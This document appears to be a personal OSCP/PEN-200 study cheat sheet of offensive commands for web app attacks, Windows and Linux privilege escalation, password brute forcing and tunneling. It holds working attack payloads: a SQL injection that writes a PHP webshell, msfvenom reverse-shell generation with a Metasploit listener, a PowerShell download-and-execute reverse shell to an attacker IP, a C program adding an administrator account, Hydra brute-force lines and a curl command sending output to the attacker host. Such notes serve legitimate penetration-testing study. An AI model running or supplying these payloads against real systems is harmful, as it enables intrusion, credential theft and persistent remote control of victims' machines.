# OSCP-Notes
Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam

Things that we should look for on a system:
    - Username and hostname
    - Group memberships of the current user
    - Existing users and groups
    - Operating system, version and architecture
    - Network information
    - Installed applications
    - Running processes


Transfer File From Windows To Linux via ssh:
    1.on linux 2. on windows:
    
        1. sudo systemctl start ssh
        2. scp C:\Users\offsec\Desktop\malware.exe shaleph@192.168.45.162:/home/shaleph/OSCP 
        
file metadata analyzer:

    exiftool -a -u <file.name>
  
Web App Pentest

    Command Injection
      Check if CMD or PowerShell we have:
        (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
      PowerCat for Reverse shell. first copy to local dir: 
        cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .


  SQLi
    MySQL:
      connect to mysql remotely:
      
        mysql -u <user> -h <ip> -P 3306 -p;
        
  commands after connection:
      
        show databases;
        select version();
        show tables in mysql;
        select * from mysql.user;
        select * from mysql.user where user = 'username';
        
  MSSQL:
      connect:
      
        impacket-mssqlclient <user>:<pass>@<ip> -windows-auth
  commnads:
  
        select @@version;
        select name from sys.databases;
        select * from <db_name>.information_schema.tables;
        select * from master.dbo.sysusers;

  Injections: 
  
      offsec' OR 1=1 -- //
      if above successful:
            ' or 1=1 in (select @@version) -- //
            
  UNION injections:
      first get number of columns (increase number by 1):
      
        ' ORDER BY 1-- //
        ' UNION SELECT null, null, database(), user(), @@version  -- //
        ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
      shell with Union
        ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

  Time Based Blind SQL:
      ' AND IF (1=1, sleep(3),'false') -- //

Anti-Virus Bypass Tools (AV Bypass) : 
    1.shellter (obfuscating and inserting payloads in file normal files) 
    2.vail - obfuscating payload codes themselfs
    Reccomendation: Use the meterpreter reverse shells and run msfconsole listener below. (adjust ofc)

Msfconsole Listener:

        msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

Payload Generator msfvenom:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe

Execution Policy on Windows:

    Get-ExecutionPolicy -Scope CurrentUser
    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
    ExecutionPolicy -bypass
    
        
Download and execute in PowerShell:

    IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
Just Download on windows:
    
    iwr -uri http://192.168.45.182/winPEASx64.exe -Outfile winPEAS.exe
    IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1")

Windows Privesc:
    Enum:
        Users and Groups:
        
            whoami
            whoami /groups
            Get-LocalUser (In PS)
            net user <username>
            Get-LocalGroup
            Get-LocalGroupMember <groupname>
        System:
            systeminfo
        Network:
            ipconfig /all
            route print
            netstat -ano (active TCP connections and ports)
        Installed Apps:
            Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
            Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
        Running Processes:
            Get-Process
        Running proccess only on RDP (if no high permission)
            Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
        Running processes for DLL hijack and unquoted service path attacks (both running and stopped processes (cant use stopped for DLL and service binary hijack):
            wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
        Check for file permissions:
            icacls "C:\xampp\apache\bin\httpd.exe"
        Search for files:
            Get-ChildItem -Path C:\ -Include *.<file.extention> -File -Recurse -ErrorAction SilentlyContinue

        Commands Executed by user:
            Get-History
            (Get-PSReadlineOption).HistorySavePath

        Run Commands as differnt user ( when we already know password and we are running RDP):
            runas /user:backupadmin cmd

    Abusin Scheduled Tasks:
        Display Tasks:
            schtasks /query /fo LIST /v
            Get-ScheduledTask

Cross compileing c program into binary for 64bit Windows in Kali

        x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
        code inside:
            #include <stdlib.h>
            
            int main ()
            {
              int i;
              
              i = system ("net user dave2 password123! /add");
              i = system ("net localgroup administrators dave2 /add");
        
              return 0;
            }

Linux Privilege Escalation:
    Manual Enumeration of OS:
        User context information:

            id
            cat /etc/passwd
            hostname
            env
        System information:
            cat /etc/issue
            cat /etc/os-release
            uname -a
        Running Processes:
            ps aux
            watch -n 1 "ps -aux | grep pass" (run ps aux every 1 second and search for word pass)
        Network info:
            ifconfig a
            ip a
            route
            routel
        For active listening ports and network connections:
            netstat -anp
            ss -anp
        Firewall Rules:
            iptables (requires root access)
            cat /etc/iptables/rules.v4 (may have access missconfigured)

        Scheduled Tasks (crons)
            ls -lah /etc/cron*
            crontab -l (list jobs for current user)
            grep "CRON" /var/log/syslog

        List apps:
            dpkg -l
        list directories that user has perrmissions on:
            find / -writable -type d 2>/dev/null

        Checking Drives and mounted filesystems:
            cat /etc/fstab
            mount
            lsblk (available disks)
        Loaded kernel modules:
            lsmod
            /sbin/modinfo <loaded module name>
        Search for SUID marked bineries:
            find / -perm -u=s -type f 2>/dev/null
        Network Traffic Capture (Requires sudo privileges)
            sudo tcpdump -i lo -A | grep "pass"

        Generate password for /etc/passwd (if writeable perrmisions)
            openssl passwd <password>
        If Any commands have SUID flag (written "s" in ls -asl (/usr/bin/ is the directory for them)):
            find /home/joe/Desktop -exec "/usr/bin/bash" -p \; (find example)
        Search for Binaries with CAPABILITIES:
            /usr/sbin/getcap -r / 2>/dev/null IF ANYthing is found with setuid+ep (effective and permitted) search on GTFOBins and then capabilities inside
        SUDO abuse:
            sudo -l and if any command appears do same thing as above about GTFOBins but sudo section
            
    Automated Testing:
        ./unix-privesc-check standard > output.txt (first download unix-privesc-check on target machine)
Password Shit:
        Hydra:

            hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.202
            hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"


PORT FORWARDING AND SSH TUNNELING
    always:
        python3 -c 'import pty;pty.spawn("/bin/bash")'
    Port Forwarding:

            socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

        scan local ips (that we get with ip route) with specific port with for loop in bash:
            for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

    SSH Local Tunneling:
            ssh -N -L 0.0.0.0:4455:172.16.200.217:445 database_admin@10.4.200.215
        check ports on listening machine:
            ss -ntplu
    Dynamic Tunneling:
            ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

SSH Remote Port Forwarding:
    on compromised machine ssh to our machine:
        on our machine:
            sudo systemctl start ssh
        con compromised:
        
        python3 -c 'import pty;pty.spawn("/bin/bash")'
        ssh -N -R 127.0.0.1:2345:10.4.200.215:5432 shaleph@192.168.45.193
SSH Dynamic Remoet Port Forwarding:
    first change proxychains :
        
        sudo nano /etc/proxychains4.conf
        socks5 127.0.0.1 9998 (on last line)
    Then on compromised machine:
        python3 -c 'import pty;pty.spawn("/bin/bash")'
        ssh -N -R 9998 sshaleph@192.168.45.225
Using SSHUTTLE:
    first we set up socat on compromised machine (requers root ssh and root python pty) and next:
    
        socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
        sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

On Windows: 
    With SSH it is the same. in cmd "where ssh.exe" and use as usual if its there:
        ssh -N -R 9998 kali@192.168.118.4
        fix proxychains after
    Plink:

            plink.exe -ssh -l shaleph -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.255
    Netsh:
        netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
        Check if listening:
            netstat -anp TCP | find "2222"
            netsh interface portproxy show all
        Make hole to to avoid firewall restriction:
            netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
        Delete the rule and port forward after done:
            netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
            netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64

HTTP Tunneling:
    Chisel: Get chisel on both compromised and local
    local:
    if error use: https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz 
    
        chisel server --port 8080 --reverse (on local)
        sudo tcpdump -nvvvXi tun0 tcp port 8080 (log incoming traffic)
    on client:
        /tmp/chisel client 192.168.45.225:8080 R:socks > /dev/null 2>&1 &
        /tmp/chisel client 192.168.45.225:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.225:8080/
    and to connect with ncat use this on our kali:
        ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.243.215
